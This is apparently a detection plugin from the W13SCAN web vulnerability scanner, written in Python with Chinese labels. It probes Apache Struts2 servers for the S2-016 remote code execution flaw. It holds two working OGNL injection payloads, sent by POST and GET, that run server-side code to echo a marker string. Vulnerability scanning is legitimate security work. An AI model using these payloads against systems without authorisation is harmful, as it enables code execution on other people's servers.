# coding   :utf-8
# file     : struts2_016.py
# author   : go0p
# time     : 2019/8/17 5:34 PM

import requests

from lib.core.common import generateResponse
from lib.core.data import conf
from lib.core.enums import WEB_PLATFORM, VulType, PLACE
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-016远程代码执行'

    def audit(self):
        if WEB_PLATFORM.JAVA in self.response.programing or conf.level >= 2:
            headers = self.response.headers
            check = '<Struts2-vuln-Check>'
            payloads = [
                r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22<Struts2-vuln-%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().print(%23b),%23matt.getWriter().print('Check>'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
                r"redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27<Struts2-vuln%27%2b%27-Check>%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d",
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r1 = requests.post(self.requests.url, headers=headers, data=payload)
                if check in r1.text:
                    result = self.new_result()
                    result.init_info(self.requests.url, "Struts2-016远程代码执行", VulType.CODE_INJECTION)
                    result.add_detail("payload探测", r1.reqinfo, generateResponse(r1),
                                      "发现回显flag:{}".format(check), "", "", PLACE.POST)
                    self.success(result)
                    return
                r2 = requests.get(self.requests.netloc + '?' + payload, headers=headers, )
                if check in r2.text:
                    result = self.new_result()
                    result.init_info(self.requests.url, "Struts2-016远程代码执行", VulType.CODE_INJECTION)
                    result.add_detail("payload探测", r2.reqinfo, generateResponse(r2),
                                      "发现回显flag:{}".format(check), "", "", PLACE.GET)
                    self.success(result)
                    return